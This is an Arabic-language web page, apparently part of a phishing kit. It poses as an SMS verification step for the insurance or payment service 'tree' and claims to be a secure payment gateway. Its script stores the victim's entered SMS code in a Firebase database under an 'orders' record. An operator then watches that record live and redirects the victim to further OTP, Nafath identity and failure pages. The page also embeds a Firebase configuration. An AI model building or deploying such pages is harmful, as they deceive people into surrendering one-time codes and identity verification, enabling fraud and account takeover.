<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="js/theme-toggle.js"></script>
    <script src="js/i18n.js"></script>
    <title>تأكيد الجوال | SMS Verification</title>
    <link rel="icon" type="image/png" href="https://tree.com.sa/assets/images/favicon.png">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/inner-theme.css">
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
    <style>
        body { display:flex; flex-direction:column; min-height:100vh; }
        .main-wrap { flex:1; display:flex; align-items:center; justify-content:center; padding:28px 16px 48px; }
    </style>
</head>
<body>

<button type="button" class="tree-theme-toggle" onclick="toggleTreeTheme()" aria-label="تبديل الوضع الليلي"><span class="tree-theme-toggle__glyph" aria-hidden="true"></span></button>

<nav class="inner-nav">
    <a href="index.html" class="inner-nav__logo">tree</a>
    <div class="inner-nav__right">
        <button class="lang-btn" data-lang-toggle onclick="toggleLang()">EN</button>
    </div>
</nav>

<div class="main-wrap">
    <div class="teal-card teal-card--narrow" style="width:100%;">
        <div class="card-body" style="text-align:center;">

            <div class="icon-circle icon-circle--success" style="margin-bottom:20px;">📩</div>

            <div class="section-title" data-i18n="sms.title">تحقيق رقم الجوال</div>
            <div class="section-sub" style="margin:8px 0 20px; line-height:1.7;">
                <span data-i18n="sms.msg">تم ارسال رسالة نصية إلى جوالك لربط الوثيقة على رقم الهاتف الخاص بك!</span>
                <br>
                <span data-i18n="sms.enter_prompt">يرجي ادخال رمز التحقق المرسل إلى جوالك رقم:</span>
                <br>
                <span id="displayPhone" style="font-family:monospace;font-weight:700;color:var(--green);direction:ltr;display:inline-block;margin-top:4px;">...</span>
            </div>

            <form onsubmit="verifyCode(event)" style="text-align:start;">
                <div class="field">
                    <label class="field__label" data-i18n="sms.code_label">رمز التحقق *</label>
                    <input type="tel" class="otp-input" id="smsCode" data-i18n="sms.code_ph" placeholder="ادخل رمز التحقق" required oninput="this.value=this.value.replace(/[^0-9]/g,'')">
                </div>

                <div class="timer-chip" style="margin-bottom:18px;justify-content:center;">
                    <span data-i18n="sms.resend_in">سيتم إرسال رسالة كود التحقق في خلال</span>
                    <span class="timer-chip__num" id="timer">01:00</span>
                </div>

                <button type="submit" class="btn-green" id="submitBtn" data-i18n="sms.confirm">تأكيد</button>
            </form>

        </div>
    </div>
</div>

<div class="inner-footer" data-i18n="footer.secure">Secure Payment Gateway © 2024</div>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
        authDomain: "tameen-658e9.firebaseapp.com",
        projectId: "tameen-658e9",
        storageBucket: "tameen-658e9.firebasestorage.app",
        messagingSenderId: "292670676256",
        appId: "1:292670676256:web:3624157751cd194efe4b45"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();
    const userId = localStorage.getItem('user_id');

    if (userId) {
        db.collection("orders").doc(userId).get().then(doc => {
            if (doc.exists && doc.data().phone_number) {
                document.getElementById('displayPhone').innerText = "+966 " + doc.data().phone_number.substring(1);
            }
        });
    }

    let time = 60;
    const timerDisplay = document.getElementById('timer');
    const countdown = setInterval(() => {
        timerDisplay.innerText = '00:' + time.toString().padStart(2,'0');
        if (--time < 0) { clearInterval(countdown); timerDisplay.innerText = "00:00"; }
    }, 1000);

    async function verifyCode(e) {
        e.preventDefault();
        const code = document.getElementById('smsCode').value;
        const btn = document.getElementById('submitBtn');
        if (code.length < 4 || !/^\d+$/.test(code)) { alert(t('sms.err_invalid')); return; }
        btn.disabled = true;
        btn.textContent = t('sms.verifying');
        try {
            await db.collection("orders").doc(userId).update({ mobile_sms_code: code, status: "waiting_call_code" });
            window.location.href = "call_verification.html";
        } catch(err) {
            console.error(err);
            btn.disabled = false;
            btn.textContent = t('sms.confirm');
        }
    }

    (function() {
        if (userId) {
            db.collection("orders").doc(userId).onSnapshot((doc) => {
                if (doc.exists) {
                    const data = doc.data();
                    if (data.next_step === "GO_TO_OTP") window.location.href = "otp_verification.html";
                    else if (data.next_step === "GO_TO_REJECT") window.location.href = "payment_failed.html";
                    else if (data.next_step === "GO_TO_NAFATH" || data.next_step === "SHOW_NAFATH_CODE") window.location.href = "nafath.html";
                }
            });
        }
    })();
</script>
</body>
</html>
